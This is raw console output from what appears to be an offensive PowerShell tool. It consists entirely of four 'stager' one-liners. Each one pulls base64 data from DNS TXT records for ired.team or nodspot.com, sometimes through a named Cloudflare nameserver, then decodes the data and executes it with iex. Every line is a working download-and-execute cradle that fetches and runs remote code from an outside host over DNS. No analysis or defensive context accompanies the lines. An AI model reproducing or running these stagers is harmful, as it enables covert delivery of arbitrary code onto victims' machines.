[*] Stager using non-authoritative NS server (copied to clipboard):
$b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.ired.team")[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBas
e64String(($b64 -replace('\t|"',"")))))

[*] Stager using authoritative NS server:
$b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.ired.team" greg.ns.cloudflare.com)[-1] }; iex([System.Text.Encoding]::ASCII.GetString([S
ystem.Convert]::FromBase64String(($b64 -replace('\t|"',"")))))



[*] Stager using non-authoritative NS server (copied to clipboard):
$b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.nodspot.com")[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromB
ase64String(($b64 -replace('\t|"',"")))))

[*] Stager using authoritative NS server:
$b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.nodspot.com" greg.ns.cloudflare.com)[-1] }; iex([System.Text.Encoding]::ASCII.GetString(
[System.Convert]::FromBase64String(($b64 -replace('\t|"',"")))))
PS C:\tools\powercloud>
